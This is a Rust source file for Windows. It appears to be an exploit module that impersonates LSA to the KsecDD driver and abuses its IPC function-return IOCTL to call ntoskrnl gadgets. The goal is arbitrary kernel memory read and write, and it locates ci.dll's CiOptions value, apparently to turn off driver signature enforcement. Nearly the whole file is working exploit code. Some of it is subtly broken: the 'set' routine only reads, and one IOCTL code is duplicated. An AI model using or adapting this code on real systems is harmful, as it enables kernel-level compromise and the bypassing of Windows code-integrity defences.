
use std::{mem::zeroed, ptr::{null, null_mut}};

use ntapi::{ntioapi::{NtDeviceIoControlFile, NtOpenFile, IO_STATUS_BLOCK}, ntobapi::NtClose, ntrtl::RtlInitUnicodeString};
use winapi::{ctypes::c_void, 
    shared::{basetsd::{PUINT32, PUINT64, UINT64, ULONG_PTR}, 
    minwindef::{BOOL, BYTE, DWORD, FALSE, HINSTANCE, LPVOID, PDWORD, TRUE}, ntdef::{InitializeObjectAttributes, HANDLE, LPCWSTR, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, OBJ_CASE_INSENSITIVE, PVOID, UNICODE_STRING}}, 
    um::{winioctl::{CTL_CODE, FILE_ANY_ACCESS, FILE_DEVICE_KSEC, FILE_WRITE_ACCESS, METHOD_BUFFERED, METHOD_NEITHER, METHOD_OUT_DIRECT}, winnt::{EVENT_MODIFY_STATE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE}}};

use crate::common::{commons::Common, nt::{FileIoCompletionNotificationInformation, NtOpenEvent, NtSetEvent, NtSetInformationFile, FILE_IO_COMPLETION_NOTIFICATION_INFORMATION, FILE_SKIP_SET_EVENT_ON_HANDLE, FILE_SKIP_SET_USER_EVENT_ON_FAST_IO}};

pub const DD_KSEC_DEVICE_NAME_U: &[u16] = &[//      L"\\Device\\KsecDD"
    b'\\' as u16, b'D' as u16, b'e' as u16, b'v' as u16, b'i' as u16, b'c' as u16, b'e' as u16,
    b'\\' as u16, b'K' as u16, b's' as u16, b'e' as u16, b'c' as u16, b'D' as u16, b'D' as u16, 0
];
pub const KSEC_EVENT_NAME_U: &[u16] = &[ //     L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED"
    b'\\' as u16, b'S' as u16, b'E' as u16, b'C' as u16, b'U' as u16, b'R' as u16, b'I' as u16, b'T' as u16, b'Y' as u16, b'\\' as u16, b'L' as u16, b'S' as u16, b'A' as u16, b'_' as u16, b'A' as u16, b'U' as u16,
    b'T' as u16, b'H' as u16, b'E' as u16, b'N' as u16, b'T' as u16, b'I' as u16, b'C' as u16, b'A' as u16, b'T' as u16, b'I' as u16, b'O' as u16, b'N' as u16, b'_' as u16, b'I' as u16, b'N' as u16, b'I' as u16,
    b'T' as u16, b'I' as u16, b'A' as u16, b'L' as u16, b'I' as u16, b'Z' as u16, b'E' as u16, b'D' as u16,
];

pub const IOCTL_KSEC_CONNECT_LSA: u32                      = 3768320;
pub const IOCTL_KSEC_RNG: u32                              = 3735556;
pub const IOCTL_KSEC_RNG_REKEY: u32                        = 3735560;
pub const IOCTL_KSEC_ENCRYPT_MEMORY: u32                   = 3735566;
pub const IOCTL_KSEC_DECRYPT_MEMORY: u32                   = 3735574;
pub const IOCTL_KSEC_ENCRYPT_MEMORY_CROSS_PROC: u32        = 3735578;
pub const IOCTL_KSEC_DECRYPT_MEMORY_CROSS_PROC: u32        = 3735582;
pub const IOCTL_KSEC_ENCRYPT_MEMORY_SAME_LOGON: u32        = 3735586;
pub const IOCTL_KSEC_DECRYPT_MEMORY_SAME_LOGON: u32        = 3735588;
pub const IOCTL_KSEC_FIPS_GET_FUNCTION_TABLE: u32          = 3735592;
pub const IOCTL_KSEC_ALLOC_POOL: u32                       = 3735596;
pub const IOCTL_KSEC_FREE_POOL: u32                        = 3735600;
pub const IOCTL_KSEC_COPY_POOL: u32                        = 3735604;
pub const IOCTL_KSEC_DUPLICATE_HANDLE: u32                 = 3735608;
pub const IOCTL_KSEC_REGISTER_EXTENSION: u32               = 3735612;
pub const IOCTL_KSEC_CLIENT_CALLBACK: u32                  = 3735616;
pub const IOCTL_KSEC_GET_BCRYPT_EXTENSION: u32             = 3735620;
pub const IOCTL_KSEC_GET_SSL_EXTENSION: u32                = 3735624;
pub const IOCTL_KSEC_GET_DEVICECONTROL_EXTENSION: u32      = 3735628;
pub const IOCTL_KSEC_ALLOC_VM: u32                         = 3735632;
pub const IOCTL_KSEC_FREE_VM: u32                          = 3735636;
pub const IOCTL_KSEC_COPY_VM: u32                          = 3735640;
pub const IOCTL_KSEC_CLIENT_FREE_VM: u32                   = 3735644;
pub const IOCTL_KSEC_INSERT_PROTECTED_PROCESS_ADDRESS: u32 = 3735644;
pub const IOCTL_KSEC_REMOVE_PROTECTED_PROCESS_ADDRESS: u32 = 3735648;
pub const IOCTL_KSEC_GET_BCRYPT_EXTENSION2: u32            = 3735652;
pub const IOCTL_KSEC_IPC_GET_QUEUED_FUNCTION_CALLS: u32    = 3735658;
pub const IOCTL_KSEC_IPC_SET_FUNCTION_RETURN: u32          = 3735663;
pub const IOCTL_KSEC_AUDIT_SELFTEST_SUCCESS: u32           = 3735667;
pub const IOCTL_KSEC_AUDIT_SELFTEST_FAILURE: u32           = 3735668;


pub const PATTERN_READ_MEMORY: [u8; 13] = [
    0x48, 0x8B, 0x41, 0x10,       // MOV   RAX, qword ptr [RCX + 0x10]
    0x49, 0x89, 0x00,             // MOV   qword ptr [R8], RAX
    0xB8, 0x01, 0x00, 0x00, 0x00, // MOV   EAX, 0x1
    0xC3                          // RET
];

pub const PATTERN_WRITE_MEMORY: [u8; 3] = [
    0x89, 0x11,                    //MOV dword ptr [RCX], EDX
    0xC3                           //RET
];

pub struct FUNCTION_RETURN {
    function: PVOID,
    argument: PVOID,
} type PFUNCTION_RETURN = *mut FUNCTION_RETURN;

pub struct SET_FUNCTION_RETURN_REQ {
    function_return: PFUNCTION_RETURN,
    value: DWORD,
} type PSET_FUNCTION_RETURN_REQ = *mut SET_FUNCTION_RETURN_REQ;

#[derive(Clone)]
pub struct KsecDD {
    m_hDevice: HANDLE,
    m_bIsInitialized: BOOL,
    m_pKernelBaseAddress: ULONG_PTR,
    m_pCiBaseAddress: ULONG_PTR,
    m_dwCiOptionsOffset: DWORD,
    m_dwReadGadgetOffset: DWORD,
    m_dwWriteGadgetOffset: DWORD,
    m_pReadGadgetAddress: ULONG_PTR,
    m_pWriteGadgetAddress: ULONG_PTR,
}

impl KsecDD {
    pub fn new(&mut self){
        let mut read_gadget_pattern= PATTERN_READ_MEMORY;
        let mut write_gadget_pattern = PATTERN_WRITE_MEMORY;

        self.m_hDevice = NULL as *mut c_void;
        self.m_bIsInitialized = FALSE;
        self.m_pKernelBaseAddress = 0;
        self.m_pCiBaseAddress = 0;
        self.m_dwCiOptionsOffset = 0;
        self.m_dwReadGadgetOffset = 0;
        self.m_dwWriteGadgetOffset = 0;
        self.m_pReadGadgetAddress = 0;
        self.m_pWriteGadgetAddress = 0;

        let _res: BOOL = Common::FindKernelModuleBaseAddress("ntoskrnl.exe".as_ptr() as *const i8, &mut self.m_pKernelBaseAddress);
        if _res == FALSE {return;};

        let _res: BOOL = Common::FindKernelModuleBaseAddress("ci.dll".as_ptr() as *const i8, &mut self.m_pCiBaseAddress);
        if _res == FALSE {return;};

        let _res: BOOL = Common::FindCIOptinOffset(&mut self.m_dwCiOptionsOffset);
        if _res == FALSE {return;}; 

        let _res: BOOL = Common::FindGadgetOffset("ntoskrnl.exe".as_ptr() as HINSTANCE, read_gadget_pattern.as_mut_ptr(), size_of_val(&read_gadget_pattern) as u32, &mut self.m_dwReadGadgetOffset);
        if _res == FALSE {return;};

        let _res: BOOL = Common::FindGadgetOffset("ntoskrnl.exe".as_ptr() as HINSTANCE, write_gadget_pattern.as_mut_ptr(), size_of_val(&write_gadget_pattern) as u32, &mut self.m_dwWriteGadgetOffset);
        if _res == FALSE {return;};

        self.m_pReadGadgetAddress = self.m_pKernelBaseAddress + (self.m_dwReadGadgetOffset as usize);
        self.m_pWriteGadgetAddress = self.m_pKernelBaseAddress + (self.m_dwWriteGadgetOffset as usize);
        self.m_bIsInitialized = TRUE;

        return;
    }


    pub fn drop(&self){
        unsafe{
            if !self.m_hDevice.is_null() {
                NtClose(self.m_hDevice);
            }
        };
    }


    pub fn IsInitialized(&self) -> BOOL{
        return self.m_bIsInitialized;
    }


    pub fn IsConnected(&self) -> BOOL {
        return (self.m_hDevice != NULL) as BOOL;
    }


    pub fn Connect(&mut self) -> BOOL{
        let mut b_result: BOOL = FALSE;

        b_result = Self::SetLsaInitializedEvent(KSEC_EVENT_NAME_U.as_ptr());
        if b_result == FALSE {return b_result;};
        b_result = Self::OpenDevice(DD_KSEC_DEVICE_NAME_U.as_ptr(), &mut self.m_hDevice);
        if b_result == FALSE {return b_result;};
        b_result = self.IoctlConnectLsa(null_mut());
        if b_result == FALSE {return b_result;};

        b_result = TRUE;
        return b_result;
    }

    pub fn Disconnect(&mut self) -> BOOL {
        let mut status: NTSTATUS;
        if self.m_hDevice.is_null() {return TRUE;};

        status = unsafe {NtClose(self.m_hDevice)};
        if !NT_SUCCESS(self.m_hDevice as i32){
            eprintln!("ERROR::NT_CLOSE");
            return FALSE;
        }

        self.m_hDevice = NULL;

        return TRUE;
    }


    pub fn QueryCiOptionsValue(&self, ci_options: PDWORD) -> BOOL {
        return  self.ReadKernelMemory32(self.m_pCiBaseAddress + self.m_dwCiOptionsOffset as usize, ci_options as PUINT32);
    }
    pub fn SetCiOptionsValue(&self, ci_options: PDWORD) -> BOOL {
        return  self.ReadKernelMemory32(self.m_pCiBaseAddress + self.m_dwCiOptionsOffset as usize, ci_options as PUINT32);
    }


    pub fn CheckIsInitialized(&self) -> BOOL{
        if self.m_bIsInitialized == FALSE{
            eprintln!("ERROR::CLIENT::NOT_INITIALIZED");
            return FALSE;
        }
        return TRUE;
    }


    pub fn SetLsaInitializedEvent(event: LPCWSTR) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut status: NTSTATUS;
        let mut h_event: HANDLE = NULL;
        let mut us_event_path: UNICODE_STRING = unsafe { std::mem::zeroed() };
        let mut oa: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };

        unsafe {
            RtlInitUnicodeString(&mut us_event_path, event);
            InitializeObjectAttributes(&mut oa, &mut us_event_path, OBJ_CASE_INSENSITIVE, NULL, NULL,);

            status = NtOpenEvent(&mut h_event, EVENT_MODIFY_STATE, &mut oa);
            if !NT_SUCCESS(status) {
                eprintln!("ERROR::NOT_OPEN::EVENT");
                if !h_event.is_null() {
                unsafe { NtClose(h_event); };
                return b_result;
            }

            return b_result;
            }

            status = NtSetEvent(h_event, null_mut());
            if !NT_SUCCESS(status) {
                eprintln!("ERROR::SET::EVENT");
                if !h_event.is_null() {
                unsafe { NtClose(h_event); };
                return b_result;
            }

            return b_result;
            }

            b_result = TRUE;
        }

        if !h_event.is_null() {
            unsafe { NtClose(h_event); }
        }

        return b_result;
    }


    pub fn OpenDevice(name: LPCWSTR, device: &mut HANDLE) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut status: NTSTATUS;
        let mut us_device_path: UNICODE_STRING = unsafe { std::mem::zeroed() };
        let mut oa: OBJECT_ATTRIBUTES        = unsafe { std::mem::zeroed() };
        let mut iosb: IO_STATUS_BLOCK        = unsafe { std::mem::zeroed() };
        let mut h_device: HANDLE             = NULL;
        let mut file_info: FILE_IO_COMPLETION_NOTIFICATION_INFORMATION =
            unsafe { std::mem::zeroed() };

        *device = NULL;

        unsafe {
            RtlInitUnicodeString(&mut us_device_path, name);
            InitializeObjectAttributes(
                &mut oa,
                &mut us_device_path,
                OBJ_CASE_INSENSITIVE,
                NULL,
                NULL,
            );

            status = NtOpenFile(
                &mut h_device,
                GENERIC_READ | GENERIC_WRITE,
                &mut oa,
                &mut iosb,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                0,
            );
            if !NT_SUCCESS(status) {
                eprintln!("ERROR::NtOpenFile");
                if !h_device.is_null() {
                    NtClose(h_device);
                }
                return b_result;
            }

            file_info.Flags = FILE_SKIP_SET_EVENT_ON_HANDLE | FILE_SKIP_SET_USER_EVENT_ON_FAST_IO;

            status = NtSetInformationFile(
                h_device,
                &mut iosb,
                &mut file_info as *mut _ as *mut c_void,
                std::mem::size_of::<FILE_IO_COMPLETION_NOTIFICATION_INFORMATION>() as u32,
                FileIoCompletionNotificationInformation,
            );
            if !NT_SUCCESS(status) {
                eprintln!("ERROR::NtSetInformationFile");
                if !h_device.is_null() {
                    NtClose(h_device);
                }
                return b_result;
            }

            *device = h_device;
            b_result = TRUE;
        }

        if b_result == FALSE && !h_device.is_null() {
            unsafe { NtClose(h_device); }
        }

        return b_result;
    }



    pub fn DeviceIoControl(device: HANDLE, io_control_code: DWORD, in_buffer: LPVOID, in_buffer_size: DWORD, out_buffer: LPVOID, out_buffer_size: DWORD) -> BOOL{
        let mut status: NTSTATUS;
        let mut iosb: IO_STATUS_BLOCK = unsafe{zeroed()};

        status = unsafe{NtDeviceIoControlFile(device, NULL, std::mem::transmute(NULL), NULL,  &mut iosb as *mut _, io_control_code, in_buffer, in_buffer_size, out_buffer, out_buffer_size)};
        if !NT_SUCCESS(status){
            eprintln!("ERROR::NtDeviceIoControlFile");
            return FALSE;
        }
        return TRUE;
    }


    pub fn IoctlConnectLsa(&self, system_pid: PDWORD)-> BOOL {
        let mut dw_lsap_system_process_id: DWORD = 0;
        let _res: BOOL = Self::DeviceIoControl(self.m_hDevice, IOCTL_KSEC_CONNECT_LSA, NULL, 0, dw_lsap_system_process_id as *mut c_void, size_of_val(&dw_lsap_system_process_id) as u32);
        if _res == FALSE {
            return FALSE;
        }
        if !system_pid.is_null() {unsafe{*system_pid = dw_lsap_system_process_id};};
        return TRUE;
    }


    pub fn IoctlIpcSetFunctionReturn(&self, request: PSET_FUNCTION_RETURN_REQ) -> BOOL {
        let _res: BOOL = Self::DeviceIoControl(self.m_hDevice, IOCTL_KSEC_IPC_SET_FUNCTION_RETURN, request as *mut c_void, size_of_val(&request) as u32, NULL, 0);
        if _res == FALSE{
            return FALSE;
        }
        return TRUE;
    }   


    pub fn ReadKernelMemory32(&self, address: ULONG_PTR, value: PUINT32) -> BOOL{
        let mut val: UINT64 = 0;
        let _res: BOOL = self.ReadKernelMemory64(address, &mut val);
        if _res == FALSE{
            return FALSE;
        }
        unsafe{*value = (val & 0xffffffff) as u32};
        return TRUE;
    }



    pub fn ReadKernelMemory64(&self, address: ULONG_PTR, value: PUINT64) -> BOOL {
        let mut fr: FUNCTION_RETURN = unsafe{zeroed()};    
        let mut req: SET_FUNCTION_RETURN_REQ = unsafe{zeroed()}; 

        if self.CheckIsInitialized() == FALSE{
            return FALSE;
        };

        fr.function = self.m_pReadGadgetAddress as PVOID;
        fr.argument = (address - 0x10) as PVOID;
        req.function_return = &mut fr as *mut _;
        req.value = 0;

        
        if self.IoctlIpcSetFunctionReturn(&mut req as *mut _) == FALSE{
            return FALSE;
        };

        unsafe{ *value = req.function_return as UINT64 };
        return TRUE;
    }


    pub fn WriteKernelMemory32(&self, address: ULONG_PTR, value: PUINT32) -> BOOL{
        let mut fr: FUNCTION_RETURN = unsafe{zeroed()};    
        let mut req: SET_FUNCTION_RETURN_REQ = unsafe{zeroed()}; 

        if self.CheckIsInitialized() == FALSE{
            return FALSE;
        };

        fr.function = self.m_pWriteGadgetAddress as PVOID;
        fr.argument = (address) as PVOID;
        req.function_return = &mut fr as *mut _;
        req.value = 0;

        if self.IoctlIpcSetFunctionReturn(&mut req as *mut _) == FALSE{
            return FALSE;
        };

        return TRUE;
    }

}
